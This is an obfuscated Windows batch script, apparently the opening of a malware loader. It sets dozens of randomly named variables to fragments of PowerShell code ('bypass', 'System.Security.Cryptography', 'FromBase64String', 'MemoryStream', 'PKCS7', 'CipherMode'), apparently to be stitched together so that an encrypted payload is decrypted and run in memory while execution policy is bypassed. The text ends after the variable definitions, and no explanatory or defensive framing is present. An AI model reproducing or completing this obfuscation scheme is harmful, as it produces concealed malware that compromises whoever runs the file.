@echo off
set "IAashYdrbe=bypa"
set "MpvlnQDbFS=y.Cr"
set "PAMdTEAfWu=g) {"
set "WZyEyCuvSt=oint"
set "CRgQKoINoH= [Sy"
set "RHjAyjVAdi=and "
set "BksJDJfmKG=('%*'"
set "FSXMUbbTUw=stem"
set "tWXNKUyZgj=Conv"
set "lDRyCPqmQY=.Cop"
set "XIhwZWVzwz=16] "
set "LxrPJjTrri=('l0"
set "njFQEIzuvR=$bzT"
set "qkwjxDqzLR=Disp"
set "TBfEGqnsFW=.Cry"
set "wqrbIHLObc=urit"
set "GKACSZYynB=y.Ci"
set "DJXFSakgmu=ing("
set "HoSsqvIDSP=.Mem"
set "lbVQSqMFTg=mory"
set "yNBVDxMlhA=HzZH"
set "nNiJrBjDjm=th('"
set "vEVjmBXPHD=$utx"
set "qawmiRUHln=;$fJ"
set "oTNlWtaMCJ=[Sys"
set "lXouDSiSrx=e]::"
set "aTdHNoBJpa=6] -"
set "cinmrLWhHK=($UO"
set "XvRNtYntxH=h.En"
set "EqmuEjzWAr=-4] "
set "xDVfGaTqWQ=comm"
set "lJJhFRRiIh=$cSd"
set "gPidhsWaBb=gnir"
set "XTWcPuRhov=LS.D"
set "NcjKwsHDIF=brea"
set "oPQNfZdsoX=oArr"
set "mLvElZOtLp= = $"
set "uJEkzIcrGK=am;$"
set "jUnSagvGYj=onve"
set "TcgTphxUSK=Mode"
set "wzBMffZOJH=-joi"
set "FyCbNRSvdg=gth)"
set "oGzWdwLIYK=morF"
set "omIhKmLtxP=TllA"
set "VkkgXsYkil=[IO."
set "mQqutrFLwL=)($u"
set "DqhDeDSAYe=:('g"
set "PpdHlBdkmD=tem."
set "trYgFydcnh= = N"
set "BzQxDtKaXT= = $"
set "SkulyvzVNn=rity"
set "brmquUcXpM=vert"
set "LWIohhugAT=-Obj"
set "TeguCYGXQP=0O+g"
set "iKIOQRmhLt=.IO."
set "tAszpxJLpR=raph"
set "YazZHTidsb=m.IO"
set "mJyYUehOZI=yste"
set "QHqzSDSCgC=3); "
set "EyEWweuNuo=tem."
set "QDeejKgCLV=;$pR"
set "xmjduKDsKu=lBlo"
set "YvmLauPnuq=PKCS"
set "FbedUzgRqo=oY.T"
set "pYywLQQEZr=txIn"
set "cxrSTZBEJd=tion"
set "AijXSfhNOt=rans"
set "TpENGpRKyw=ew-O"
set "kPxzSLrxkJ=CwCy"
